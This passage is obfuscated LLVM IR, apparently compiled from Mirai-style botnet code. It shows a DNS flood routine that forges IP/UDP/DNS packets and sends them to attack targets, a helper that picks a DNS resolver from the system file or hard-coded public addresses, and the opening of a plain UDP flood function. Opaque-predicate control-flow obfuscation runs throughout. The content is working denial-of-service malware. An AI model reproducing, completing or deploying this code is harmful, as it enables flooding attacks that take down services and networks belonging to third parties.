  %460 = call zeroext i16 @checksum_generic(i16* %459, i32 20)
  %461 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %464 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %463, i32 0, i32 3
  store i16 0, i16* %464, align 2
  %465 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %466 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %467 = bitcast %struct.udphdr* %466 to i8*
  %468 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 2
  %470 = load i16, i16* %469, align 2
  %471 = load i8, i8* %19, align 1
  %472 = zext i8 %471 to i64
  %473 = add i64 21, %472
  %474 = add i64 %473, 2
  %475 = load i32, i32* %21, align 4
  %476 = sext i32 %475 to i64
  %477 = add i64 %474, %476
  %478 = add i64 %477, 4
  %479 = trunc i64 %478 to i32
  %480 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %465, i8* %467, i16 zeroext %470, i32 %479)
  %481 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 3
  store i16 %480, i16* %482, align 2
  %483 = load i32, i32* %22, align 4
  %484 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %485 = load i32, i32* %9, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 0
  %489 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %488, i32 0, i32 2
  %490 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %489, i32 0, i32 0
  store i32 %483, i32* %490, align 4
  %491 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %492 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %491, i32 0, i32 1
  %493 = load i16, i16* %492, align 2
  %494 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %495 = load i32, i32* %9, align 4
  %496 = sext i32 %495 to i64
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %494, i64 %496
  %498 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %497, i32 0, i32 0
  %499 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %498, i32 0, i32 1
  store i16 %493, i16* %499, align 2
  %500 = load i32, i32* %10, align 4
  %501 = load i8*, i8** %32, align 8
  %502 = load i8, i8* %19, align 1
  %503 = zext i8 %502 to i64
  %504 = add i64 41, %503
  %505 = add i64 %504, 2
  %506 = load i32, i32* %21, align 4
  %507 = sext i32 %506 to i64
  %508 = add i64 %505, %507
  %509 = add i64 %508, 4
  %510 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %511 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %512 = load i32, i32* %9, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 0
  %516 = bitcast %struct.sockaddr_in* %515 to %struct.sockaddr*
  store %struct.sockaddr* %516, %struct.sockaddr** %510, align 8
  %517 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %518 = load %struct.sockaddr*, %struct.sockaddr** %517, align 8
  %519 = call i64 @sendto(i32 %500, i8* %501, i64 %509, i32 16384, %struct.sockaddr* %518, i32 16)
  br label %520

; <label>:520:                                    ; preds = %452
  %521 = load i32, i32* @x.35
  %522 = load i32, i32* @y.36
  %523 = sub i32 %521, 1
  %524 = mul i32 %521, %523
  %525 = urem i32 %524, 2
  %526 = icmp eq i32 %525, 0
  %527 = icmp slt i32 %522, 10
  %528 = or i1 %526, %527
  br i1 %528, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %520
  %529 = load i32, i32* %9, align 4
  %530 = add nsw i32 %529, 1
  store i32 %530, i32* %9, align 4
  %531 = load i32, i32* @x.35
  %532 = load i32, i32* @y.36
  %533 = sub i32 %531, 1
  %534 = mul i32 %531, %533
  %535 = urem i32 %534, 2
  %536 = icmp eq i32 %535, 0
  %537 = icmp slt i32 %532, 10
  %538 = or i1 %536, %537
  br i1 %538, label %originalBBpart256, label %originalBB49alteredBB

originalBBpart256:                                ; preds = %originalBB49
  br label %326

; <label>:539:                                    ; preds = %326
  %540 = load i32, i32* @x.35
  %541 = load i32, i32* @y.36
  %542 = sub i32 %540, 1
  %543 = mul i32 %540, %542
  %544 = urem i32 %543, 2
  %545 = icmp eq i32 %544, 0
  %546 = icmp slt i32 %541, 10
  %547 = or i1 %545, %546
  br i1 %547, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %539
  %548 = load i32, i32* @x.35
  %549 = load i32, i32* @y.36
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %325

; <label>:556:                                    ; preds = %originalBBpart24, %86, %80
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %87
  store i32 1, i32* %9, align 4
  %557 = load i32, i32* %10, align 4
  %558 = bitcast i32* %9 to i8*
  %559 = call i32 @setsockopt(i32 %557, i32 0, i32 3, i8* %558, i32 4) #6
  %560 = icmp eq i32 %559, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %108
  %561 = load i32, i32* %10, align 4
  %562 = call i32 @close(i32 %561)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %267
  %563 = load i8, i8* %24, align 1
  %_ = shl i8 %563, 1
  %_7 = sub i8 %563, 1
  %gen = mul i8 %_7, 1
  %_8 = shl i8 %563, 1
  %_9 = shl i8 %563, 1
  %_10 = sub i8 0, %563
  %gen11 = add i8 %_10, 1
  %_12 = sub i8 %563, 1
  %gen13 = mul i8 %_12, 1
  %564 = add i8 %563, 1
  store i8 %564, i8* %24, align 1
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %308
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %331
  %565 = load i8**, i8*** %11, align 8
  %566 = load i32, i32* %9, align 4
  %567 = sext i32 %566 to i64
  %568 = getelementptr inbounds i8*, i8** %565, i64 %567
  %569 = load i8*, i8** %568, align 8
  store i8* %569, i8** %32, align 8
  %570 = load i8*, i8** %32, align 8
  %571 = bitcast i8* %570 to %struct.iphdr*
  store %struct.iphdr* %571, %struct.iphdr** %33, align 8
  %572 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i64 1
  %574 = bitcast %struct.iphdr* %573 to %struct.udphdr*
  store %struct.udphdr* %574, %struct.udphdr** %34, align 8
  %575 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %576 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %575, i64 1
  %577 = bitcast %struct.udphdr* %576 to %struct.dnshdr*
  store %struct.dnshdr* %577, %struct.dnshdr** %35, align 8
  %578 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %579 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %578, i64 1
  %580 = bitcast %struct.dnshdr* %579 to i8*
  %581 = getelementptr inbounds i8, i8* %580, i64 1
  store i8* %581, i8** %36, align 8
  %582 = load i16, i16* %13, align 2
  %583 = zext i16 %582 to i32
  %584 = icmp eq i32 %583, 65535
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %368
  %585 = call i32 @rand_next()
  %_26 = sub i32 %585, 65535
  %gen27 = mul i32 %_26, 65535
  %_28 = sub i32 0, %585
  %gen29 = add i32 %_28, 65535
  %_30 = sub i32 0, %585
  %gen31 = add i32 %_30, 65535
  %586 = and i32 %585, 65535
  %587 = trunc i32 %586 to i16
  %588 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 3
  store i16 %587, i16* %589, align 4
  br label %originalBB25

originalBB35alteredBB:                            ; preds = %originalBB35, %394
  %590 = call i32 @rand_next()
  %_36 = shl i32 %590, 65535
  %_37 = shl i32 %590, 65535
  %_38 = sub i32 0, %590
  %gen39 = add i32 %_38, 65535
  %_40 = sub i32 %590, 65535
  %gen41 = mul i32 %_40, 65535
  %591 = and i32 %590, 65535
  %592 = trunc i32 %591 to i16
  %593 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %594 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %593, i32 0, i32 0
  store i16 %592, i16* %594, align 2
  br label %originalBB35

originalBB45alteredBB:                            ; preds = %originalBB45, %426
  %595 = load i16, i16* %18, align 2
  %596 = zext i16 %595 to i32
  %597 = icmp eq i32 %596, 65535
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %520
  %598 = load i32, i32* %9, align 4
  %_50 = sub i32 0, %598
  %gen51 = add i32 %_50, 1
  %_52 = sub i32 %598, 1
  %gen53 = mul i32 %_52, 1
  %_54 = shl i32 %598, 1
  %599 = add nsw i32 %598, 1
  store i32 %599, i32* %9, align 4
  br label %originalBB49

originalBB58alteredBB:                            ; preds = %originalBB58, %539
  br label %originalBB58
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.37
  %2 = load i32, i32* @y.38
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %19 = call i8* @table_retrieve_val(i32 30, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 30)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.37
  %24 = load i32, i32* @y.38
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %159

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* %10, align 4
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %34 = call i64 @read(i32 %32, i8* %33, i64 2048)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @close(i32 %36)
  call void @table_unlock_val(i8 zeroext 31)
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %39 = load i32, i32* %11, align 4
  %40 = call i8* @table_retrieve_val(i32 31, i32* null)
  %41 = call i32 @util_stristr(i8* %38, i32 %39, i8* %40)
  store i32 %41, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 31)
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %142

; <label>:44:                                     ; preds = %31
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %45 = load i32, i32* %12, align 4
  store i32 %45, i32* %14, align 4
  br label %46

; <label>:46:                                     ; preds = %132, %44
  %47 = load i32, i32* @x.37
  %48 = load i32, i32* @y.38
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i32, i32* %14, align 4
  %56 = load i32, i32* %11, align 4
  %57 = icmp slt i32 %55, %56
  %58 = load i32, i32* @x.37
  %59 = load i32, i32* @y.38
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %135

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* %14, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  store i8 %70, i8* %18, align 1
  %71 = load i8, i8* %16, align 1
  %72 = icmp ne i8 %71, 0
  br i1 %72, label %100, label %73

; <label>:73:                                     ; preds = %66
  %74 = load i8, i8* %18, align 1
  %75 = sext i8 %74 to i32
  %76 = icmp eq i32 %75, 32
  br i1 %76, label %97, label %77

; <label>:77:                                     ; preds = %73
  %78 = load i32, i32* @x.37
  %79 = load i32, i32* @y.38
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = load i8, i8* %18, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp eq i32 %87, 9
  %89 = load i32, i32* @x.37
  %90 = load i32, i32* @y.38
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %88, label %97, label %98

; <label>:97:                                     ; preds = %originalBBpart28, %73
  br label %132

; <label>:98:                                     ; preds = %originalBBpart28
  store i8 1, i8* %16, align 1
  br label %99

; <label>:99:                                     ; preds = %98
  br label %100

; <label>:100:                                    ; preds = %99, %66
  %101 = load i8, i8* %18, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 46
  br i1 %103, label %104, label %112

; <label>:104:                                    ; preds = %100
  %105 = load i8, i8* %18, align 1
  %106 = sext i8 %105 to i32
  %107 = icmp slt i32 %106, 48
  br i1 %107, label %117, label %108

; <label>:108:                                    ; preds = %104
  %109 = load i8, i8* %18, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp sgt i32 %110, 57
  br i1 %111, label %117, label %112

; <label>:112:                                    ; preds = %108, %100
  %113 = load i32, i32* %14, align 4
  %114 = load i32, i32* %11, align 4
  %115 = sub nsw i32 %114, 1
  %116 = icmp eq i32 %113, %115
  br i1 %116, label %117, label %131

; <label>:117:                                    ; preds = %112, %108, %104
  %118 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %120 = load i32, i32* %12, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i32, i32* %14, align 4
  %124 = load i32, i32* %12, align 4
  %125 = sub nsw i32 %123, %124
  call void @util_memcpy(i8* %118, i8* %122, i32 %125)
  %126 = load i32, i32* %14, align 4
  %127 = load i32, i32* %12, align 4
  %128 = sub nsw i32 %126, %127
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %129
  store i8 0, i8* %130, align 1
  store i8 1, i8* %17, align 1
  br label %135

; <label>:131:                                    ; preds = %112
  br label %132

; <label>:132:                                    ; preds = %131, %97
  %133 = load i32, i32* %14, align 4
  %134 = add nsw i32 %133, 1
  store i32 %134, i32* %14, align 4
  br label %46

; <label>:135:                                    ; preds = %117, %originalBBpart24
  %136 = load i8, i8* %17, align 1
  %137 = icmp ne i8 %136, 0
  br i1 %137, label %138, label %141

; <label>:138:                                    ; preds = %135
  %139 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %140 = call i32 @inet_addr(i8* %139) #6
  store i32 %140, i32* %9, align 4
  br label %170

; <label>:141:                                    ; preds = %135
  br label %142

; <label>:142:                                    ; preds = %141, %31
  %143 = load i32, i32* @x.37
  %144 = load i32, i32* @y.38
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %142
  %151 = load i32, i32* @x.37
  %152 = load i32, i32* @y.38
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %159

; <label>:159:                                    ; preds = %originalBBpart212, %originalBBpart2
  %160 = call i32 @rand_next()
  %161 = urem i32 %160, 4
  switch i32 %161, label %170 [
    i32 0, label %162
    i32 1, label %164
    i32 2, label %166
    i32 3, label %168
  ]

; <label>:162:                                    ; preds = %159
  %163 = call i32 @htonl(i32 134744072) #7
  store i32 %163, i32* %9, align 4
  br label %170

; <label>:164:                                    ; preds = %159
  %165 = call i32 @htonl(i32 1246898730) #7
  store i32 %165, i32* %9, align 4
  br label %170

; <label>:166:                                    ; preds = %159
  %167 = call i32 @htonl(i32 1074151430) #7
  store i32 %167, i32* %9, align 4
  br label %170

; <label>:168:                                    ; preds = %159
  %169 = call i32 @htonl(i32 67240450) #7
  store i32 %169, i32* %9, align 4
  br label %170

; <label>:170:                                    ; preds = %168, %166, %164, %162, %159, %138
  %171 = load i32, i32* %9, align 4
  ret i32 %171

originalBBalteredBB:                              ; preds = %originalBB, %0
  %172 = alloca i32, align 4
  %173 = alloca i32, align 4
  %174 = alloca i32, align 4
  %175 = alloca i32, align 4
  %176 = alloca [2048 x i8], align 16
  %177 = alloca i32, align 4
  %178 = alloca [32 x i8], align 16
  %179 = alloca i8, align 1
  %180 = alloca i8, align 1
  %181 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %182 = call i8* @table_retrieve_val(i32 30, i32* null)
  %183 = call i32 (i8*, i32, ...) @open(i8* %182, i32 0)
  store i32 %183, i32* %173, align 4
  call void @table_lock_val(i8 zeroext 30)
  %184 = load i32, i32* %173, align 4
  %185 = icmp sge i32 %184, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %186 = load i32, i32* %14, align 4
  %187 = load i32, i32* %11, align 4
  %188 = icmp slt i32 %186, %187
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %189 = load i8, i8* %18, align 1
  %190 = sext i8 %189 to i32
  %191 = icmp eq i32 %190, 9
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %142
  br label %originalBB10
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %73

; <label>:54:                                     ; preds = %4
  %55 = load i32, i32* @x.39
  %56 = load i32, i32* @y.40
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %54
  %63 = load i16, i16* %13, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %63) #7
  store i16 %64, i16* %13, align 2
  %65 = load i32, i32* @x.39
  %66 = load i32, i32* @y.40
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %73

; <label>:73:                                     ; preds = %originalBBpart2, %51
  store i32 0, i32* %9, align 4
  br label %74

; <label>:74:                                     ; preds = %282, %73
  %75 = load i32, i32* @x.39
  %76 = load i32, i32* @y.40
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = load i32, i32* %9, align 4
  %84 = load i8, i8* %5, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp slt i32 %83, %85
  %87 = load i32, i32* @x.39
  %88 = load i32, i32* @y.40
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %86, label %95, label %285

; <label>:95:                                     ; preds = %originalBBpart24
  %96 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %97 = load i8**, i8*** %10, align 8
  %98 = load i32, i32* %9, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8*, i8** %97, i64 %99
  store i8* %96, i8** %100, align 8
  %101 = load i16, i16* %12, align 2
  %102 = zext i16 %101 to i32
  %103 = icmp eq i32 %102, 65535
  br i1 %103, label %104, label %113

; <label>:104:                                    ; preds = %95
  %105 = call i32 @rand_next()
  %106 = trunc i32 %105 to i16
  %107 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 1
  store i16 %106, i16* %112, align 2
  br label %138

; <label>:113:                                    ; preds = %95
  %114 = load i32, i32* @x.39
  %115 = load i32, i32* @y.40
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i16, i16* %12, align 2
  %123 = call zeroext i16 @htons(i16 zeroext %122) #7
  %124 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %124, i64 %126
  %128 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i32 0, i32 0
  %129 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %128, i32 0, i32 1
  store i16 %123, i16* %129, align 2
  %130 = load i32, i32* @x.39
  %131 = load i32, i32* @y.40
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %138

; <label>:138:                                    ; preds = %originalBBpart28, %104
  %139 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %140 = load i32*, i32** %11, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds i32, i32* %140, i64 %142
  store i32 %139, i32* %143, align 4
  %144 = icmp eq i32 %139, -1
  br i1 %144, label %145, label %146

; <label>:145:                                    ; preds = %138
  ret void

; <label>:146:                                    ; preds = %138
  %147 = load i32, i32* @x.39
  %148 = load i32, i32* @y.40
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %146
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %155, align 4
  %156 = load i16, i16* %13, align 2
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %156, i16* %157, align 2
  %158 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %159 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %158, i32 0, i32 0
  store i32 0, i32* %159, align 4
  %160 = load i32*, i32** %11, align 8
  %161 = load i32, i32* %9, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i32, i32* %160, i64 %162
  %164 = load i32, i32* %163, align 4
  %165 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %166 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %165, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @bind(i32 %164, %struct.sockaddr* %168, i32 16) #6
  %170 = icmp eq i32 %169, -1
